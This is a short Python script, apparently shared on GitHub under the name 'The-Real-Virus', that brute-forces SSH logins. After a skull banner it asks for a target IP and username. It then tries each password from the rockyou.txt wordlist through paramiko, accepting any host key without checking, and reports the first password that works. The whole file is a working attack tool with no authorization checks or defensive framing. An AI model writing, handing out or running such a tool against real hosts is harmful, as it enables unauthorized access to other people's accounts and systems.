import paramiko
import os

# Display Banner
def show_banner():
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  SSH Login Brute Force
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)

# Main script logic
def main():
    # Show the banner
    show_banner()

    # Prompt the user to continue or exit
    choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()
    if choice == 'n':
        print("\nExiting the script. Goodbye!")
        return
    elif choice == 'y':
        # Clear the terminal screen
        os.system('clear' if os.name == 'posix' else 'cls')  # 'clear' for Linux/Mac, 'cls' for Windows

        # Main functionality
        host = input("Enter the target host IP: ")
        username = input("Enter the target username: ")

        attempts = 0

        try:
            # Open the password list file
            with open("rockyou.txt", "r") as password_list:
                for password in password_list:
                    password = password.strip("\n")
                    attempts += 1
                    print(f"[{attempts}] Attempting Password: '{password}'")

                    try:
                        # Initialize SSH client
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                        # Try to connect
                        client.connect(hostname=host, username=username, password=password, timeout=1)

                        print(f"[>] Valid Password Found: '{password}'!")
                        client.close()
                        break  # Exit the loop once a valid password is found

                    except paramiko.AuthenticationException:
                        print("[x] Invalid Password!")
                    except Exception as e:
                        print(f"[!] Error: {e}")

        except FileNotFoundError:
            print("[!] Password file 'rockyou.txt' not found!")
        except KeyboardInterrupt:
            print("\n[!] Script interrupted by user.")
    else:
        print("\nInvalid choice. Exiting the script.")

# Run the main function
if __name__ == "__main__":
    main()
